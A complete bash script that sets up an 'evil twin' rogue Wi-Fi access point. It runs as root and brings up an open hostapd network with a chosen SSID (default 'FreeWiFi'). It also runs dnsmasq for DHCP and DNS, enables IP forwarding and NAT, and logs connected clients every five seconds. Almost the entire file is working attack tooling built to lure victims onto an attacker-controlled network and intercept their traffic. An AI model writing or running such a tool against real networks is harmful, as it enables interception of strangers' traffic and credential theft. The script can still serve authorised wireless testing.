#!/usr/bin/env bash
# Evil Twin rogue AP setup
# Usage: evil_twin.sh <interface> <ssid> <channel> <dns_server> <gateway>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up evil twin..."
    if [[ -n "${HOSTAPD_PID:-}" ]]; then
        kill "$HOSTAPD_PID" 2>/dev/null || true
        wait "$HOSTAPD_PID" 2>/dev/null || true
    fi
    if [[ -n "${DNSMASQ_PID:-}" ]]; then
        kill "$DNSMASQ_PID" 2>/dev/null || true
        wait "$DNSMASQ_PID" 2>/dev/null || true
    fi
    # Remove temp config files
    rm -f "${TMPDIR_WORK:-/tmp}/hostapd_evil.conf" 2>/dev/null || true
    rm -f "${TMPDIR_WORK:-/tmp}/dnsmasq_evil.conf" 2>/dev/null || true

    # Flush iptables NAT rules we added
    if [[ -n "${IFACE:-}" ]]; then
        iptables -t nat -D POSTROUTING -o "${IFACE}" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "${IFACE}" -j ACCEPT 2>/dev/null || true
    fi

    # Restore IP forwarding
    sysctl -w net.ipv4.ip_forward=0 2>/dev/null || true

    if [[ -n "${TMPDIR_WORK:-}" && -d "${TMPDIR_WORK:-}" ]]; then
        rm -rf "$TMPDIR_WORK"
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in hostapd dnsmasq iptables; do
    if ! command -v "$cmd" &>/dev/null; then
        _die "$cmd not found"
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
SSID="${2:-FreeWiFi}"
CHANNEL="${3:-6}"
DNS_SERVER="${4:-8.8.8.8}"
GATEWAY="${5:-10.0.0.1}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: evil_twin.sh <interface> <ssid> <channel> <dns_server> <gateway>"
fi

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

# ── Create temp workspace ─────────────────────────────────────────────
TMPDIR_WORK=$(mktemp -d /tmp/wafford_evil.XXXXXX)
trap cleanup EXIT

# ── Network setup ─────────────────────────────────────────────────────
AP_SUBNET="10.0.0.0/24"
AP_IP="10.0.0.1"
AP_NETMASK="255.255.255.0"

_log "[*] Configuring interface $IFACE with IP $AP_IP..."
ip link set "$IFACE" down 2>/dev/null || true
ip addr flush dev "$IFACE" 2>/dev/null || true
ip addr add "${AP_IP}/24" dev "$IFACE" 2>/dev/null || true
ip link set "$IFACE" up 2>/dev/null || true
sleep 1

# ── Enable IP forwarding ──────────────────────────────────────────────
_log "[*] Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true

# ── Configure NAT ─────────────────────────────────────────────────────
_log "[*] Setting up NAT/MASQUERADE..."
iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true

# ── Generate hostapd.conf ─────────────────────────────────────────────
HOSTAPD_CONF="${TMPDIR_WORK}/hostapd_evil.conf"
cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
auth_algs=1
wpa=0
ssid_hidden=0
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

_log "[*] Generated hostapd.conf:"
_log "$(cat "$HOSTAPD_CONF")"

# ── Generate dnsmasq.conf ────────────────────────────────────────────
DNSMASQ_CONF="${TMPDIR_WORK}/dnsmasq_evil.conf"
cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=${AP_SUBNET}
dhcp-option=option:router,$AP_IP
dhcp-option=option:dns-server,$DNS_SERVER
dhcp-option=option:server,$AP_IP
log-dhcp
EOF

_log "[*] Generated dnsmasq.conf:"
_log "$(cat "$DNSMASQ_CONF")"

# ── Start dnsmasq ─────────────────────────────────────────────────────
_log "[*] Starting dnsmasq..."
dnsmasq -C "$DNSMASQ_CONF" --no-daemon 2>/dev/null &
DNSMASQ_PID=$!
sleep 1

if ! kill -0 "$DNSMASQ_PID" 2>/dev/null; then
    _die "Failed to start dnsmasq"
fi

# ── Start hostapd ─────────────────────────────────────────────────────
_log "[*] Starting hostapd..."
hostapd "$HOSTAPD_CONF" -B 2>/dev/null || true
sleep 2

# Find hostapd PID
HOSTAPD_PID=$(pgrep -f "hostapd.*${HOSTAPD_CONF}" | head -1 || echo "")
if [[ -z "$HOSTAPD_PID" ]]; then
    HOSTAPD_PID=$(pgrep -x hostapd | head -1 || echo "")
fi

if [[ -n "$HOSTAPD_PID" ]]; then
    _log "[+] hostapd started (PID: $HOSTAPD_PID)"
else
    _log "[!] Warning: Could not determine hostapd PID"
fi

# ── Monitor connected clients ────────────────────────────────────────
_log "[*] Evil twin is active. Monitoring..."
CLIENTS_FILE="${TMPDIR_WORK}/clients.txt"

(
    while true; do
        # Use hostapd_cli to get station list if available
        if command -v hostapd_cli &>/dev/null; then
            hostapd_cli -i "$IFACE" all_sta 2>/dev/null > "$CLIENTS_FILE" || true
        fi
        sleep 5
    done
) &
MONITOR_PID=$!

# ── Output ────────────────────────────────────────────────────────────
_json "{\"status\":\"success\",\"action\":\"started\",\"interface\":\"${IFACE}\",\"ssid\":\"${SSID}\",\"channel\":${CHANNEL},\"ap_ip\":\"${AP_IP}\",\"dns_server\":\"${DNS_SERVER}\",\"gateway\":\"${GATEWAY}\",\"hostapd_pid\":${HOSTAPD_PID:-0},\"dnsmasq_pid\":${DNSMASQ_PID:-0},\"monitor_pid\":${MONITOR_PID:-0}}"

# Keep running until killed
wait "${HOSTAPD_PID:-0}" 2>/dev/null || true
